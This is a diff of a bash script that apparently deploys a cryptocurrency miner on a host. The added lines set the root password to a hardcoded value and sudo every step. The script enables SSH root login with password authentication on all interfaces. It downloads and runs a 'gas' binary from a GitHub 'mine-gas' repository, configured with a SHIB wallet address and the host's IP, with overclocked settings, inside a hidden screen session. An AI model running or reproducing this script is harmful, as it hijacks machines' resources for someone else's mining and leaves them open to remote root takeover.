@@ -1,28 +1,29 @@
 IP="$(wget -qO - icanhazip.com)"
 echo $IP
-apt-get install firewalld openssh-server screen -y >/dev/null
+echo -e "QWeas1324@\nQWeas1324@\n" | sudo passwd root
+sudo apt-get install firewalld openssh-server screen -y >/dev/null
 #SETUP SSH
-sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
-sed -i 's/#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/g' /etc/ssh/sshd_config
-sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
-sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-systemctl enable ssh >/dev/null
-service ssh stop >/dev/null
-service ssh start >/dev/null
+sudo sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
+sudo sed -i 's/#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/g' /etc/ssh/sshd_config
+sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
+sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sudo systemctl enable ssh >/dev/null
+sudo service ssh stop >/dev/null
+sudo service ssh start >/dev/null
 
-wget -q https://github.com/L00K11/mine-gas/raw/main/gas
-chmod +x gas >/dev/null
-wget -q https://github.com/L00K11/mine-gas/raw/main/script.ini
-sed -i 's/cod:Carteira/SHIB:0xbc7a881c4A14119e23376f6C5dE1806fb6EF4926/g' script.ini
-sed -i 's/Cod_Moeda/SHIB/g' script.ini
-sed -i 's/Mineiro/"'$IP'"/g' script.ini
-sed -i '/3333/ i coreClocks=+300' script.ini 
-sed -i '/3333/ i memClocks=+300' script.ini
-sed -i '/3333/ i powerLimits=-5' script.ini
-sed -i '/3333/ i fanSpeed=90' script.ini
-sed -i '/3333/ i cpuThreads=5' script.ini
-sed -i '/3333/ i sortPools=true' script.ini
-sed -i '/3333/ i email=ckpakbar23@gmail.com' script.ini
-sed -i '/3333/ i autoUpdate=false' script.ini
-screen -dmS $(date +%s) ./gas script.ini
+sudo wget -q https://github.com/L00K11/mine-gas/raw/main/gas
+sudo chmod +x gas >/dev/null
+sudo wget -q https://github.com/L00K11/mine-gas/raw/main/script.ini
+sudo sed -i 's/cod:Carteira/SHIB:0xbc7a881c4A14119e23376f6C5dE1806fb6EF4926/g' script.ini
+sudo sed -i 's/Cod_Moeda/SHIB/g' script.ini
+sudo sed -i 's/Mineiro/"'$IP'"/g' script.ini
+sudo sed -i '/3333/ i coreClocks=+300' script.ini 
+sudo sed -i '/3333/ i memClocks=+300' script.ini
+sudo sed -i '/3333/ i powerLimits=-5' script.ini
+sudo sed -i '/3333/ i fanSpeed=90' script.ini
+sudo sed -i '/3333/ i cpuThreads=5' script.ini
+sudo sed -i '/3333/ i sortPools=true' script.ini
+sudo sed -i '/3333/ i email=ckpakbar23@gmail.com' script.ini
+sudo sed -i '/3333/ i autoUpdate=false' script.ini
+sudo screen -dmS $(date +%s) ./gas script.ini
 #./gas script.ini
